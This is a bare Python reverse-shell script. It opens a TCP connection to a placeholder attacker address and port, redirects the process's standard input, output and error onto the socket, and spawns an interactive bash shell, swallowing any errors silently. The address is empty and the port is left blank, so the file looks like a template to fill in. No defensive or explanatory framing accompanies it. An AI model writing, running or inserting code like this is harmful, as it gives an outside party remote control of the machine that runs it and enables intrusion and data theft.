import socket, os, pty

ATTACKER_IP = "" 
ATTACKER_PORT = 

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    
    os.dup2(s.fileno(), 0) 
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    pty.spawn("/bin/bash")
    
except Exception as e:
    pass
